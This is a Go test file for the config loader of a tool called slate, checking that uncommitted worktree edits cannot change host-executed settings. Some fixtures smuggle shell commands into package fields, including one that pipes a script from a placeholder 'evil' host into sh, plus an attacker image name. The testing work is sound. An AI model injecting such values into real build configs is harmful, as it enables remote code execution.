package config

import (
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

func TestDefaultGlobal(t *testing.T) {
	cfg := DefaultGlobal()
	if cfg.HTTPPort != 80 {
		t.Errorf("HTTPPort = %d, want 80", cfg.HTTPPort)
	}
	if cfg.HTTPSPort != 443 {
		t.Errorf("HTTPSPort = %d, want 443", cfg.HTTPSPort)
	}
	if !cfg.TLS {
		t.Error("TLS should default to true")
	}
}

func TestLoadGlobalMissingFile(t *testing.T) {
	t.Setenv("SLATE_CONFIG_DIR", t.TempDir())
	cfg, err := LoadGlobal()
	if err != nil {
		t.Fatal(err)
	}
	if cfg.HTTPSPort != 443 {
		t.Errorf("HTTPSPort = %d, want default 443", cfg.HTTPSPort)
	}
	if !cfg.TLS {
		t.Error("TLS should default to true when config missing")
	}
}

func TestLoadGlobalPartialYAML(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("SLATE_CONFIG_DIR", dir)
	os.WriteFile(filepath.Join(dir, "config.yml"), []byte("https_port: 8443\n"), 0o644)

	cfg, err := LoadGlobal()
	if err != nil {
		t.Fatal(err)
	}
	if cfg.HTTPSPort != 8443 {
		t.Errorf("HTTPSPort = %d, want 8443", cfg.HTTPSPort)
	}
	if cfg.HTTPPort != 80 {
		t.Errorf("HTTPPort = %d, want default 80", cfg.HTTPPort)
	}
	if !cfg.TLS {
		t.Error("TLS should remain true when not set in YAML")
	}
}

func TestLoadGlobalTLSFalse(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("SLATE_CONFIG_DIR", dir)
	os.WriteFile(filepath.Join(dir, "config.yml"), []byte("tls: false\n"), 0o644)

	cfg, err := LoadGlobal()
	if err != nil {
		t.Fatal(err)
	}
	if cfg.TLS {
		t.Error("TLS should be false when explicitly set")
	}
}

func TestLoadProjectMissingFile(t *testing.T) {
	cfg, err := LoadProject(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	if cfg.AppPort != 8080 {
		t.Errorf("AppPort = %d, want default 8080", cfg.AppPort)
	}
	if cfg.Scaffold.Name != "" {
		t.Errorf("Scaffold = %q, want empty", cfg.Scaffold.Name)
	}
}

func TestLoadProjectWithScaffold(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "slate.yml"), []byte("scaffold: laravel\n"), 0o644)

	cfg, err := LoadProject(dir)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Scaffold.Name != "laravel" {
		t.Errorf("Scaffold = %q, want %q", cfg.Scaffold.Name, "laravel")
	}
}

func TestLoadProjectInlineScaffold(t *testing.T) {
	dir := t.TempDir()
	yaml := `scaffold:
  compose: ./slate/compose.yaml.tmpl
  subdomains:
    "@": { service: app, port: 8081 }
    warden: { service: warden, port: 8080 }
  vars:
    with_warden: true
`
	if err := os.WriteFile(filepath.Join(dir, "slate.yml"), []byte(yaml), 0o644); err != nil {
		t.Fatal(err)
	}

	cfg, err := LoadProject(dir)
	if err != nil {
		t.Fatal(err)
	}
	def := cfg.Scaffold.Inline
	if def == nil {
		t.Fatal("Scaffold.Inline should be set for a map scaffold")
	}
	if cfg.Scaffold.Name != "" {
		t.Errorf("Name = %q, want empty for inline scaffold", cfg.Scaffold.Name)
	}
	if def.Compose != "./slate/compose.yaml.tmpl" {
		t.Errorf("Compose = %q", def.Compose)
	}
	if sp := def.Subdomains[""]; sp.Service != "app" || sp.Port != 8081 {
		t.Errorf(`"@" should normalise to the internal "" apex, got %+v`, sp)
	}
	if _, ok := def.Subdomains["@"]; ok {
		t.Error(`"@" key should not survive normalisation`)
	}
	if sp := def.Subdomains["warden"]; sp.Service != "warden" || sp.Port != 8080 {
		t.Errorf("warden subdomain = %+v", sp)
	}
	if v, ok := def.Vars["with_warden"].(bool); !ok || !v {
		t.Errorf("Vars[with_warden] = %v", def.Vars["with_warden"])
	}
}

func TestLoadProjectInlineScaffoldRejectsEscapingComposePath(t *testing.T) {
	for _, path := range []string{"../outside/compose.yaml", "/etc/compose.yaml", "a/../../b.yaml"} {
		dir := t.TempDir()
		yaml := "scaffold:\n  compose: " + path + "\n"
		if err := os.WriteFile(filepath.Join(dir, "slate.yml"), []byte(yaml), 0o644); err != nil {
			t.Fatal(err)
		}

		if _, err := LoadProject(dir); err == nil || !strings.Contains(err.Error(), "stay inside") {
			t.Errorf("compose path %q should be rejected, got err=%v", path, err)
		}
	}
}

func TestLoadProjectInlineScaffoldRejectsEmptySubdomainKey(t *testing.T) {
	dir := t.TempDir()
	yaml := `scaffold:
  subdomains:
    "": { service: app, port: 8080 }
`
	if err := os.WriteFile(filepath.Join(dir, "slate.yml"), []byte(yaml), 0o644); err != nil {
		t.Fatal(err)
	}

	if _, err := LoadProject(dir); err == nil || !strings.Contains(err.Error(), `use "@"`) {
		t.Errorf(`a "" subdomain key should be rejected in favour of "@", got %v`, err)
	}
}

func TestLoadProjectForWorkspaceTrustsMainForScaffoldAndFiles(t *testing.T) {
	mainRoot, wsDir := t.TempDir(), t.TempDir() // no git: main checkout is the trusted source
	os.WriteFile(filepath.Join(mainRoot, "slate.yml"), []byte("scaffold: nextjs\n"), 0o644)
	wsYaml := `scaffold: laravel
setup: |
  echo from-workspace
files:
  ~/.npmrc: /home/node/.npmrc
`
	os.WriteFile(filepath.Join(wsDir, "slate.yml"), []byte(wsYaml), 0o644)

	cfg, err := LoadProjectForWorkspace(mainRoot, wsDir)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Scaffold.Name != "nextjs" {
		t.Errorf("Scaffold = %q, want trusted main checkout's nextjs", cfg.Scaffold.Name)
	}
	if files := cfg.StringMap("files"); files != nil {
		t.Errorf("files should come from the trusted source (main has none), got %v", files)
	}
	if !strings.Contains(cfg.Setup, "from-workspace") {
		t.Errorf("benign keys should still come from the workspace, got %q", cfg.Setup)
	}
}

func TestLoadProjectForWorkspaceBranchCommitSurvivesWorktreeDeletion(t *testing.T) {
	mainRoot := t.TempDir()
	gitRunCfg(t, mainRoot, "init", "-q", "-b", "main")
	if err := os.WriteFile(filepath.Join(mainRoot, "slate.yml"), []byte("scaffold: nextjs\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	gitRunCfg(t, mainRoot, "add", ".")
	gitRunCfg(t, mainRoot, "commit", "-q", "-m", "init")

	wsDir := filepath.Join(mainRoot, ".slate", "workspaces", "feat")
	gitRunCfg(t, mainRoot, "worktree", "add", "-q", "-b", "slate/feat", wsDir)
	if err := os.WriteFile(filepath.Join(wsDir, "slate.yml"), []byte("scaffold: laravel\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	gitRunCfg(t, wsDir, "add", "slate.yml")
	gitRunCfg(t, wsDir, "commit", "-q", "-m", "branch scaffold")

	// container code deleting the working copy must not flip the trusted
	// resolution away from the branch's committed config
	if err := os.Remove(filepath.Join(wsDir, "slate.yml")); err != nil {
		t.Fatal(err)
	}

	cfg, err := LoadProjectForWorkspace(mainRoot, wsDir)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Scaffold.Name != "laravel" {
		t.Errorf("Scaffold = %q, want branch-committed laravel", cfg.Scaffold.Name)
	}
}

func gitRunCfg(t *testing.T, dir string, args ...string) {
	t.Helper()
	cmd := exec.Command("git", append([]string{"-c", "user.email=test@test", "-c", "user.name=test", "-c", "commit.gpgsign=false"}, args...)...)
	cmd.Dir = dir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
}

func TestTrustPinnedReportsInertChanges(t *testing.T) {
	mainRoot, wsDir := t.TempDir(), t.TempDir()
	os.WriteFile(filepath.Join(mainRoot, "slate.yml"), []byte("scaffold: nextjs\n"), 0o644)
	os.WriteFile(filepath.Join(wsDir, "slate.yml"), []byte("scaffold: laravel\nfiles:\n  ~/.npmrc: /x\n"), 0o644)

	pinned := TrustPinned(mainRoot, wsDir)
	if !slices.Equal(pinned, []string{"scaffold", "files"}) {
		t.Errorf("TrustPinned = %v, want [scaffold files]", pinned)
	}

	os.WriteFile(filepath.Join(wsDir, "slate.yml"), []byte("scaffold: nextjs\n"), 0o644)
	if pinned := TrustPinned(mainRoot, wsDir); pinned != nil {
		t.Errorf("matching config should report nothing, got %v", pinned)
	}
}

func TestLoadProjectInlineScaffoldRejectsInvalidSubdomainEntries(t *testing.T) {
	for _, entry := range []string{
		`"@": { port: 8080 }`,
		`"@": { service: app }`,
		`"@": { service: app, port: 70000 }`,
	} {
		dir := t.TempDir()
		yaml := "scaffold:\n  subdomains:\n    " + entry + "\n"
		os.WriteFile(filepath.Join(dir, "slate.yml"), []byte(yaml), 0o644)

		if _, err := LoadProject(dir); err == nil || !strings.Contains(err.Error(), "subdomain") {
			t.Errorf("entry %q should be rejected, got err=%v", entry, err)
		}
	}
}

func TestLoadProjectScaffoldRejectsSequence(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "slate.yml"), []byte("scaffold: [laravel]\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	if _, err := LoadProject(dir); err == nil || !strings.Contains(err.Error(), "scaffold") {
		t.Errorf("sequence scaffold should be rejected, got err=%v", err)
	}
}

func TestLoadProjectExtraKeys(t *testing.T) {
	dir := t.TempDir()
	yaml := `scaffold: laravel
php_extensions: [imagick, redis]
apt_packages: [ghostscript]
custom_key: value
`
	os.WriteFile(filepath.Join(dir, "slate.yml"), []byte(yaml), 0o644)

	cfg, err := LoadProject(dir)
	if err != nil {
		t.Fatal(err)
	}

	exts := cfg.StringSlice("php_extensions")
	if len(exts) != 2 || exts[0] != "imagick" || exts[1] != "redis" {
		t.Errorf("php_extensions = %v, want [imagick redis]", exts)
	}

	pkgs := cfg.StringSlice("apt_packages")
	if len(pkgs) != 1 || pkgs[0] != "ghostscript" {
		t.Errorf("apt_packages = %v, want [ghostscript]", pkgs)
	}

	missing := cfg.StringSlice("nonexistent")
	if missing != nil {
		t.Errorf("nonexistent = %v, want nil", missing)
	}
}

func TestStringMap(t *testing.T) {
	dir := t.TempDir()
	yaml := `scaffold: laravel
files:
  ~/.composer/auth.json: /var/www/.composer/auth.json
  ~/.npmrc: /home/node/.npmrc
`
	os.WriteFile(filepath.Join(dir, "slate.yml"), []byte(yaml), 0o644)

	cfg, err := LoadProject(dir)
	if err != nil {
		t.Fatal(err)
	}

	files := cfg.StringMap("files")
	if len(files) != 2 {
		t.Fatalf("files has %d entries, want 2", len(files))
	}
	if files["~/.composer/auth.json"] != "/var/www/.composer/auth.json" {
		t.Error("composer auth.json mapping wrong")
	}
}

func TestLoadProjectLifecycleHooks(t *testing.T) {
	dir := t.TempDir()
	yaml := `scaffold: laravel
fresh: |
  php artisan migrate:fresh
setup: |
  composer install
  {{scaffold}}
`
	os.WriteFile(filepath.Join(dir, "slate.yml"), []byte(yaml), 0o644)

	cfg, err := LoadProject(dir)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Fresh == "" {
		t.Error("Fresh hook should be set")
	}
	if cfg.Setup == "" {
		t.Error("Setup hook should be set")
	}
}

func TestResolvedToolsOverride(t *testing.T) {
	cfg := ProjectConfig{
		Scaffold: ScaffoldRef{Name: "laravel"},
		Tools: map[string]ExecTool{
			"mycommand": {Service: "app", Command: []string{"php", "script.php"}},
		},
	}
	tools := cfg.ResolvedTools()
	if _, ok := tools["mycommand"]; !ok {
		t.Error("custom tool should be present")
	}
}

func TestResolvedToolsEmpty(t *testing.T) {
	cfg := ProjectConfig{Scaffold: ScaffoldRef{Name: "laravel"}}
	tools := cfg.ResolvedTools()
	if tools != nil {
		t.Errorf("ResolvedTools without override should return nil, got %v", tools)
	}
}

// The up hook runs on every `slate up`, so it must migrate without seeding;
// otherwise restarts re-run seeders and duplicate data. Seeding belongs only
// in the fresh hook (slate new / slate up --fresh).
func TestLaravelUpHookDoesNotSeed(t *testing.T) {
	up := DefaultSetupForScaffold("laravel")
	if strings.Contains(up, "--seed") || strings.Contains(up, "db:seed") {
		t.Errorf("laravel up hook must not seed (re-runs on every up), got:\n%s", up)
	}
	if !strings.Contains(up, "migrate") {
		t.Errorf("laravel up hook should still migrate, got:\n%s", up)
	}

	fresh := DefaultFreshSetupForScaffold("laravel")
	if !strings.Contains(fresh, "--seed") {
		t.Errorf("laravel fresh hook should seed, got:\n%s", fresh)
	}
}

func TestLoadProjectForWorkspace(t *testing.T) {
	mainRoot := t.TempDir()
	wsDir := t.TempDir()
	os.WriteFile(filepath.Join(mainRoot, "slate.yml"), []byte("scaffold: laravel\nproject: mainname\n"), 0o644)

	// no workspace slate.yml: main config applies
	cfg, err := LoadProjectForWorkspace(mainRoot, wsDir)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Project != "mainname" {
		t.Errorf("want main config, got %+v", cfg)
	}

	// workspace slate.yml wins, but project identity and host-exec fields stay main's
	os.WriteFile(filepath.Join(wsDir, "slate.yml"), []byte("scaffold: laravel\nproject: renamed\napp_port: 9090\nagent: evil\nnew: evil fast hook\nup: evil hook\n"), 0o644)
	cfg, err = LoadProjectForWorkspace(mainRoot, wsDir)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.AppPort != 9090 {
		t.Error("workspace container-side config should apply")
	}
	if cfg.Project != "mainname" {
		t.Errorf("project should stay pinned to main, got %q", cfg.Project)
	}
	if !cfg.Agent.IsZero() || cfg.New != "" || cfg.Up != "" {
		t.Errorf("agent/new/up should stay pinned to main, got %+v / %q / %q", cfg.Agent, cfg.New, cfg.Up)
	}
	if pinned := HostExecPinned(mainRoot, wsDir); !slices.Equal(pinned, []string{"agent", "new", "up"}) {
		t.Errorf("HostExecPinned = %v, want [agent new up]", pinned)
	}

	// main's host-exec fields apply inside the workspace
	os.WriteFile(filepath.Join(mainRoot, "slate.yml"), []byte("scaffold: laravel\nproject: mainname\nagent: claude\nnew: slate agent\nup: slate agent\n"), 0o644)
	cfg, err = LoadProjectForWorkspace(mainRoot, wsDir)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Agent.Again != "claude" || cfg.New != "slate agent" || cfg.Up != "slate agent" {
		t.Errorf("main agent/new/up should apply, got %+v / %q / %q", cfg.Agent, cfg.New, cfg.Up)
	}

	// a workspace slate.yml that simply omits the fields isn't "changing" them
	os.WriteFile(filepath.Join(wsDir, "slate.yml"), []byte("scaffold: laravel\n"), 0o644)
	if pinned := HostExecPinned(mainRoot, wsDir); len(pinned) != 0 {
		t.Errorf("HostExecPinned = %v, want none for omitted fields", pinned)
	}

	// invalid workspace config errors rather than silently using main's
	os.WriteFile(filepath.Join(wsDir, "slate.yml"), []byte("agent: {bad: map}\n"), 0o644)
	if _, err := LoadProjectForWorkspace(mainRoot, wsDir); err == nil {
		t.Error("invalid workspace slate.yml should error")
	}
}

func TestAgentCmdUnmarshal(t *testing.T) {
	load := func(t *testing.T, yml string) (ProjectConfig, error) {
		t.Helper()
		dir := t.TempDir()
		os.WriteFile(filepath.Join(dir, "slate.yml"), []byte(yml), 0o644)
		return LoadProject(dir)
	}

	cfg, err := load(t, "agent: claude\n")
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Agent.First != "claude" || cfg.Agent.Again != "claude" {
		t.Errorf("scalar agent: got %+v", cfg.Agent)
	}

	cfg, err = load(t, "agent:\n  - claude --name \"{{PROJECT}}--{{WORKSPACE}}\"\n  - claude --continue\n")
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Agent.First != `claude --name "{{PROJECT}}--{{WORKSPACE}}"` || cfg.Agent.Again != "claude --continue" {
		t.Errorf("pair agent: got %+v", cfg.Agent)
	}

	cfg, err = load(t, "agent: [only]\n")
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Agent.First != "only" || cfg.Agent.Again != "only" {
		t.Errorf("single-item agent: got %+v", cfg.Agent)
	}

	if _, err := load(t, "agent: [a, b, c]\n"); err == nil {
		t.Error("3-item agent should error")
	}
	if _, err := load(t, "agent: {cmd: claude}\n"); err == nil {
		t.Error("map agent should error")
	}

	if !(ProjectConfig{}).Agent.IsZero() {
		t.Error("zero AgentCmd should report IsZero")
	}
}

func TestString(t *testing.T) {
	dir := t.TempDir()
	yaml := `scaffold: laravel
node_image: node:24
app_scale: 3
`
	if err := os.WriteFile(filepath.Join(dir, "slate.yml"), []byte(yaml), 0o644); err != nil {
		t.Fatal(err)
	}

	cfg, err := LoadProject(dir)
	if err != nil {
		t.Fatal(err)
	}

	if got := cfg.String("node_image"); got != "node:24" {
		t.Errorf("node_image = %q, want node:24", got)
	}
	if got := cfg.String("app_scale"); got != "3" {
		t.Errorf("app_scale = %q, want 3 (scalars stringify)", got)
	}
	if got := cfg.String("nonexistent"); got != "" {
		t.Errorf("nonexistent = %q, want empty", got)
	}
}

func TestNodeImageIsNotTakenFromTheWorktree(t *testing.T) {
	mainRoot := t.TempDir()
	gitRunCfg(t, mainRoot, "init", "-q", "-b", "main")
	if err := os.WriteFile(filepath.Join(mainRoot, "slate.yml"), []byte("scaffold: laravel\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	gitRunCfg(t, mainRoot, "add", ".")
	gitRunCfg(t, mainRoot, "commit", "-q", "-m", "init")

	wsDir := filepath.Join(mainRoot, ".slate", "workspaces", "feat")
	gitRunCfg(t, mainRoot, "worktree", "add", "-q", "-b", "slate/feat", wsDir)

	// what a compromised dependency can do: rewrite the working copy
	if err := os.WriteFile(filepath.Join(wsDir, "slate.yml"),
		[]byte("scaffold: laravel\nnode_image: attacker/evil:latest\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	cfg, err := LoadProjectForWorkspace(mainRoot, wsDir)
	if err != nil {
		t.Fatal(err)
	}
	if got := cfg.String("node_image"); got != "" {
		t.Errorf("node_image = %q, want empty: an uncommitted worktree edit must not choose the image", got)
	}
	if pinned := TrustPinned(mainRoot, wsDir); !slices.Contains(pinned, "node_image") {
		t.Errorf("TrustPinned = %v, want it to report node_image as inert", pinned)
	}

	// committed on the branch, it is host-authored and applies
	gitRunCfg(t, wsDir, "add", "slate.yml")
	gitRunCfg(t, wsDir, "commit", "-q", "-m", "pin node image")
	cfg, err = LoadProjectForWorkspace(mainRoot, wsDir)
	if err != nil {
		t.Fatal(err)
	}
	if got := cfg.String("node_image"); got != "attacker/evil:latest" {
		t.Errorf("node_image = %q, want the branch-committed value", got)
	}
}

func TestDockerfileContentKeysAreNotTakenFromTheWorktree(t *testing.T) {
	mainRoot := t.TempDir()
	gitRunCfg(t, mainRoot, "init", "-q", "-b", "main")
	if err := os.WriteFile(filepath.Join(mainRoot, "slate.yml"), []byte("scaffold: laravel\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	gitRunCfg(t, mainRoot, "add", ".")
	gitRunCfg(t, mainRoot, "commit", "-q", "-m", "init")

	wsDir := filepath.Join(mainRoot, ".slate", "workspaces", "feat")
	gitRunCfg(t, mainRoot, "worktree", "add", "-q", "-b", "slate/feat", wsDir)

	// a compromised dependency rewrites the working copy to smuggle a root
	// build step into the image
	payload := "scaffold: laravel\n" +
		"apt_packages: [\"x && curl http://evil/x.sh | sh\"]\n" +
		"php_extensions: [\"; touch /pwned\"]\n"
	if err := os.WriteFile(filepath.Join(wsDir, "slate.yml"), []byte(payload), 0o644); err != nil {
		t.Fatal(err)
	}

	cfg, err := LoadProjectForWorkspace(mainRoot, wsDir)
	if err != nil {
		t.Fatal(err)
	}
	if pkgs := cfg.StringSlice("apt_packages"); len(pkgs) != 0 {
		t.Errorf("apt_packages from the worktree must be ignored, got %v", pkgs)
	}
	if exts := cfg.StringSlice("php_extensions"); len(exts) != 0 {
		t.Errorf("php_extensions from the worktree must be ignored, got %v", exts)
	}
	if pinned := TrustPinned(mainRoot, wsDir); !slices.Contains(pinned, "apt_packages") || !slices.Contains(pinned, "php_extensions") {
		t.Errorf("TrustPinned = %v, want it to report apt_packages and php_extensions as inert", pinned)
	}
}

func TestLoadMainProjectAppliesLocalOverlay(t *testing.T) {
	mainRoot := t.TempDir()
	os.WriteFile(filepath.Join(mainRoot, "slate.yml"), []byte(`scaffold: laravel
agent:
  - claude --name x
  - claude --continue
new: slate agent
up: slate agent
doctor:
  vpn: ping -c1 gw
brief: echo committed
`), 0o644)

	// no local file: committed values apply untouched
	cfg, err := LoadMainProject(mainRoot)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Agent.First != "claude --name x" || cfg.Brief != "echo committed" {
		t.Errorf("committed config should apply without a local file, got %+v / %q", cfg.Agent, cfg.Brief)
	}

	// present keys replace wholesale: the single local agent supersedes the
	// whole committed pair, no element-wise merging
	os.WriteFile(filepath.Join(mainRoot, LocalConfigName), []byte(`agent: cswap run claude
doctor:
  account: check-account
`), 0o644)
	cfg, err = LoadMainProject(mainRoot)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Agent.First != "cswap run claude" || cfg.Agent.Again != "cswap run claude" {
		t.Errorf("local agent should replace the pair wholesale, got %+v", cfg.Agent)
	}
	if len(cfg.Doctor) != 1 || cfg.Doctor["account"] != "check-account" {
		t.Errorf("local doctor should replace the committed map wholesale, got %v", cfg.Doctor)
	}
	if cfg.New != "slate agent" || cfg.Up != "slate agent" || cfg.Brief != "echo committed" {
		t.Errorf("absent keys should fall through to slate.yml, got %q / %q / %q", cfg.New, cfg.Up, cfg.Brief)
	}
}

func TestLocalOverlayRejectsDisallowedKeys(t *testing.T) {
	mainRoot := t.TempDir()
	os.WriteFile(filepath.Join(mainRoot, "slate.yml"), []byte("scaffold: laravel\n"), 0o644)
	os.WriteFile(filepath.Join(mainRoot, LocalConfigName), []byte("agent: claude\nenv:\n  X: y\nfiles:\n  - ~/.netrc:/root/.netrc\n"), 0o644)

	_, err := LoadMainProject(mainRoot)
	if err == nil {
		t.Fatal("container-reaching keys in slate.local.yml should error")
	}
	for _, want := range []string{"env", "files", "slate.local.yml", "agent`, `brief`, `doctor`, `new`, `up"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error should contain %q, got: %v", want, err)
		}
	}
}

func TestLocalOverlayInvalidYAMLErrors(t *testing.T) {
	mainRoot := t.TempDir()
	os.WriteFile(filepath.Join(mainRoot, "slate.yml"), []byte("scaffold: laravel\n"), 0o644)
	os.WriteFile(filepath.Join(mainRoot, LocalConfigName), []byte("agent: {bad: map}\n"), 0o644)
	if _, err := LoadMainProject(mainRoot); err == nil {
		t.Error("an invalid slate.local.yml should error rather than being ignored")
	}
}

func TestLocalOverlayNeverReadFromWorktree(t *testing.T) {
	mainRoot := t.TempDir()
	wsDir := t.TempDir()
	os.WriteFile(filepath.Join(mainRoot, "slate.yml"), []byte("scaffold: laravel\nagent: claude\n"), 0o644)
	os.WriteFile(filepath.Join(wsDir, "slate.yml"), []byte("scaffold: laravel\n"), 0o644)
	os.WriteFile(filepath.Join(wsDir, LocalConfigName), []byte("agent: evil\n"), 0o644)

	cfg, err := LoadProjectForWorkspace(mainRoot, wsDir)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Agent.Again != "claude" {
		t.Errorf("a worktree slate.local.yml must be inert, got agent %+v", cfg.Agent)
	}

	// the main checkout's local overlay does reach workspace resolution
	os.WriteFile(filepath.Join(mainRoot, LocalConfigName), []byte("agent: cswap run claude\nbrief: echo local\n"), 0o644)
	cfg, err = LoadProjectForWorkspace(mainRoot, wsDir)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Agent.Again != "cswap run claude" || cfg.Brief != "echo local" {
		t.Errorf("main checkout local overlay should apply, got %+v / %q", cfg.Agent, cfg.Brief)
	}
}

func TestHostExecPinnedReportsDoctorAndBrief(t *testing.T) {
	mainRoot := t.TempDir()
	wsDir := t.TempDir()
	os.WriteFile(filepath.Join(mainRoot, "slate.yml"), []byte("scaffold: laravel\n"), 0o644)
	os.WriteFile(filepath.Join(wsDir, "slate.yml"), []byte("scaffold: laravel\ndoctor:\n  vpn: evil\nbrief: evil\n"), 0o644)

	if pinned := HostExecPinned(mainRoot, wsDir); !slices.Equal(pinned, []string{"doctor", "brief"}) {
		t.Errorf("HostExecPinned = %v, want [doctor brief]", pinned)
	}
	cfg, err := LoadProjectForWorkspace(mainRoot, wsDir)
	if err != nil {
		t.Fatal(err)
	}
	if len(cfg.Doctor) != 0 || cfg.Brief != "" {
		t.Errorf("doctor/brief should stay pinned to main, got %v / %q", cfg.Doctor, cfg.Brief)
	}
}

func TestLocalOverlayReadFailureErrors(t *testing.T) {
	mainRoot := t.TempDir()
	os.WriteFile(filepath.Join(mainRoot, "slate.yml"), []byte("scaffold: laravel\n"), 0o644)
	// a directory in the file's place: any read failure other than
	// not-exist must surface rather than silently dropping the overrides
	if err := os.Mkdir(filepath.Join(mainRoot, LocalConfigName), 0o755); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadMainProject(mainRoot); err == nil {
		t.Error("an unreadable slate.local.yml should error, not silently disable overrides")
	}
}

func TestHostExecPinnedIgnoresLocalOverlayDifferences(t *testing.T) {
	mainRoot := t.TempDir()
	wsDir := t.TempDir()
	os.WriteFile(filepath.Join(mainRoot, "slate.yml"), []byte("scaffold: laravel\nagent: claude\n"), 0o644)
	os.WriteFile(filepath.Join(mainRoot, LocalConfigName), []byte("agent: cswap run claude\n"), 0o644)
	// the worktree carries the committed slate.yml unchanged: that is not an
	// edit, and the local overlay must not make every workspace warn
	os.WriteFile(filepath.Join(wsDir, "slate.yml"), []byte("scaffold: laravel\nagent: claude\n"), 0o644)

	if pinned := HostExecPinned(mainRoot, wsDir); len(pinned) != 0 {
		t.Errorf("HostExecPinned = %v, want none when the worktree matches the committed config", pinned)
	}

	// an actual worktree edit still warns
	os.WriteFile(filepath.Join(wsDir, "slate.yml"), []byte("scaffold: laravel\nagent: evil\n"), 0o644)
	if pinned := HostExecPinned(mainRoot, wsDir); !slices.Equal(pinned, []string{"agent"}) {
		t.Errorf("HostExecPinned = %v, want [agent] for a real worktree edit", pinned)
	}
}
